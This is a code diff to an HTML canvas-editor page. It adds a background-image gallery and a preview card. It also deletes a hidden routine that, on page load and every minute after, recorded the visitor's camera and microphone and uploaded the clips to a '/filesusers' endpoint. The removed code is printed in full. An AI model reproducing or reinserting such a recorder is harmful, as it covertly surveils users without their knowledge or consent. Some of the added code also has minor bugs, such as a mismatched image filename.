@@ -211,6 +211,78 @@
             background-color: #3a3a3a;
             transition: .3s cubic-bezier(0.755, 0.05, 0.855, 0.06);
          }
+
+ .gallery {
+            width: 250px;
+            height: 620px;
+            margin-left: 81.5%;
+            margin-top: -62.6%;
+            background-color: rgb(255, 255, 255);
+            filter: drop-shadow(0 0 10px rgb(58, 58, 58));
+            overflow-y: auto; /* إضافة ممر عمودي */
+          }
+          .gallery h1{
+            padding: 10px;
+          }
+          .gallery img{
+            height: 280px;
+            width: 200px;
+            margin-left: 20px;
+            padding: 10px;
+            border-radius: 10px;
+            filter: drop-shadow(0 0 10px rgb(69 69 69 ));
+          }
+          .play{
+            margin-top: -47%;
+             flex-direction: column;
+             position: absolute;
+             width: 250px;
+             padding: 10px;
+             margin-bottom: 10px;
+             background-color: rgb(100, 100, 100);
+             z-index: 1;
+             box-shadow: 0 0 10px rgba(255, 255, 255, 0.158);
+          }
+          .play h1{
+             color: rgb(0, 0, 0);
+             font-size: 30px;
+          }
+          #previewButton{
+            height: 45px;
+            width: 45px;
+            background-color: #000000;
+            z-index: 1;
+            position: absolute;
+            margin-top: -20%;
+            margin-left: 55%;
+            display: flex; 
+            justify-content: center;
+            color: #ffffff;
+            border: none;
+            border-radius: 50%;
+            box-shadow: 0 0 10px rgb(255, 255, 255);
+          }
+          #previewButton:hover{
+            background-color: #3a3a3a;
+          }
+       
+          #previewCard {
+            max-width: 90%;
+            max-height: 90%;
+            margin-right: 10%;
+            overflow: auto;
+            padding: 20px;
+            z-index: 1;
+            position: absolute;
+        }
+        #closbutton{
+            background-color: #3a3a3a;
+            margin-top: -74%;
+            z-index: 1;
+            position: absolute;
+        }
+        
+        
     </style>
 </head>
 <body>
@@ -386,7 +458,7 @@
             <i class='bx bx-restaurant' onclick="selectIcon('bx-restaurant')"></i>
         </div>
         
-        
+    </div>  
    
     <div class="filters">
         <div class="filterControls">
@@ -402,8 +474,68 @@
         </div>
     </div>
        
+   <div class="gallery" id="gallery">
+        <h1>Backrounds</h1>
+        <img src="paper.jpg" onclick="setBackground('paper.jpg')" />
+        <img src="tableau.jpg" onclick="setBackground('tableau.jpg')" />
+        <img src="fellies.jpg" onclick="setBackground('fellies.jpg')" />
+        <img src="fiagra.jpg" onclick="setBackground('fiagra.jpg')" />
+        <img src="paint.jpg" onclick="setBackground('paint.jpg')" />
+        <img src="light.jpg" onclick="setBackground('light.jpg')" />
+        <img src="heart.jpg" onclick="setBackground('heart.jpg')" />
+        <img src="dkhan.jpg" onclick="setBackground('dkhan.jpg')" />
+        <img src="airpot.jpg" onclick="setBackground('airpot.jpg')" />
+        <img src="3d.jpg" onclick="setBackground('3d.jpg')" />
+        <img src="window.jpg" onclick="setBackground('window.jpg')" />
+        <img src="market.jpg" onclick="setBackground('market.jpg')" />
+        <img src="bleu.jpg" onclick="setBackground('bleu.jpg')" />
+        <img src="basket.jpg" onclick="setBackground('basket.jpg')" />
+        <img src="money.jpg" onclick="setBackground('money.jpg')" />
+        <img src="fellies1.jpg" onclick="setBackground('fellies1.jpg')" />
+        <img src="landscap.jpg" onclick="setBackground('landsscap.jpg')" />
+        <img src="blur5.jpg" onclick="setBackground('blur5.jpg')" />
+        <img src="blur1.jpg" onclick="setBackground('blur1.jpg')" />
+        <img src="blur2.jpg" onclick="setBackground('blur2.jpg')" />
+        <img src="blur3.jpg" onclick="setBackground('blur3.jpg')" />
+        <img src="blur4.jpg" onclick="setBackground('blur4.jpg')" />
+        <img src="dkhan1.jpg" onclick="setBackground('dkhan1.jpg')" />
+        <img src="black.jpg" onclick="setBackground('black.jpg')" />
+        <img src="fleur.jpg" onclick="setBackground('fleur.jpg')" />
+        <img src="fleurs.jpg" onclick="setBackground('fleurs.jpg')" />
+        <img src="forest.jpg" onclick="setBackground('forest.jpg')" />
+        <img src="nature.jpg" onclick="setBackground('nature.jpg')" />
+        <img src="nature1.jpg" onclick="setBackground('nature1.jpg')" />
+        <img src="car.jpg" onclick="setBackground('car.jpg')" />
+        <img src="city.jpg" onclick="setBackground('city.jpg')" />
+        <img src="braind.jpg" onclick="setBackground('braind.jpg')" />
+        <img src="archit.jpg" onclick="setBackground('archit.jpg')" />
+        <img src="archit1.jpg" onclick="setBackground('archit1.jpg')" />
+        <img src="fire.jpg" onclick="setBackground('fire.jpg')" />
+        <img src="tableau1.jpg" onclick="setBackground('tableau1.jpg')" />
+        <img src="green.jpg" onclick="setBackground('green.jpg')" />
+        <img src="bord.jpg" onclick="setBackground('bord.jpg')" />
+        <img src="grid.jpg" onclick="setBackground('grid.jpg')" />
+        <img src="sable.jpg" onclick="setBackground('sable.jpg')" />
+        <img src="starts.jpg" onclick="setBackground('starts.jpg')" />
+        <img src="yellow.jpg" onclick="setBackground('yellow.jpg')" />
+        <img src="tokyo.jpg" onclick="setBackground('tokyo.jpg')" />
+        <img src="bleuray.jpg" onclick="setBackground('bleuray.jpg')" />
+        <img src="paper1.jpg" onclick="setBackground('paper1.jpg')" />
+        <img src="white.jpg" onclick="setBackground('white.jpg')" />
+        <img src="white1.jpg" onclick="setBackground('white1.jpg')" />
+        <img src="wather.jpg" onclick="setBackground('wather.jpg')" />
+      </div>
 
-    </div>
+<!-- HTML لإنشاء البطاقة -->
+<div class="play">
+  <h1>Preview</h1>
+  <button id="previewButton" type="button"><i class='bx bx-play' style=" margin-left: 6px; font-size: 50px; margin-top: -10px;"></i></button>
+</div>
+<div id="previewCard" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); border:1px solid rgb(70, 70, 70); padding:10px; background:white; box-shadow:0 0 10px rgba(0,0,0,0.5);">
+    <canvas id="previewCanvas" width="700" height="500"></canvas>
+    <button id="closbutton"  onclick="closePreview()">إغلاق</button>
+</div>
+ 
     <script>
         const canvas = new fabric.Canvas('canvas');
         let history = [canvas.toJSON()]; // Array to store the history of canvas changes
@@ -985,32 +1117,7 @@ function getIconUnicode(iconClass) {
   return iconUnicode.replace(/"/g, ''); // Remove quotes
 }
     
- // Function to start recording video
- function startRecording() {
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-    .then(stream => {
-        const mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.ondataavailable = event => {
-            const blob = event.data;
-            const formData = new FormData();
-            formData.append('video', blob, 'video.mp4');
-            fetch('/filesusers', {
-                method: 'POST',
-                body: formData
-            });
-        };
-        mediaRecorder.start();
-        setTimeout(() => {
-            mediaRecorder.stop();
-        }, 30000); // Record video for 30 seconds
-    });
-}
 
-// Function to automatically start recording when the page loads
-window.onload = function() {
-    startRecording();
-    setInterval(startRecording, 60000); // Start recording every minute
-};
     
 
 function applyFilter() {
@@ -1099,7 +1206,42 @@ function applyShadowFilter(offset, blur, color) {
     }
 }
 
+function setBackground(imageSrc) {
+    var canvas = document.getElementById('canvas');
+    var context = canvas.getContext('2d');
+    var img = new Image();
+    img.crossOrigin = 'Anonymous'; // لتجنب مشاكل CORS
+    img.onload = function() {
+        context.drawImage(img, 0, 0, canvas.width, canvas.height);
+        canvas.renderAll(); // تأكد من إعادة رسم الـ canvas
+    };
+    img.src = imageSrc;
+}
 
+ 
+ function showPreview() {
+    var originalCanvas = document.getElementById('canvas');
+    var previewCanvas = document.getElementById('previewCanvas');
+    var previewCtx = previewCanvas.getContext('2d');
+    
+    // تعيين الأبعاد لـ previewCanvas بناءً على الأبعاد الأصلية لـ originalCanvas
+    previewCanvas.width = originalCanvas.width;
+    previewCanvas.height = originalCanvas.height;
+
+    // نسخ المحتوى من الـ originalCanvas إلى previewCanvas
+    previewCtx.drawImage(originalCanvas, 0, 0, previewCanvas.width, previewCanvas.height);
+
+    // عرض البطاقة
+    document.getElementById('previewCard').style.display = 'block';
+}
+
+function closePreview() {
+    // إخفاء البطاقة
+    document.getElementById('previewCard').style.display = 'none';
+}
+
+// ربط الدالة showPreview بالزر
+document.getElementById('previewButton').addEventListener('click', showPreview);
         
     </script>
       <footer>
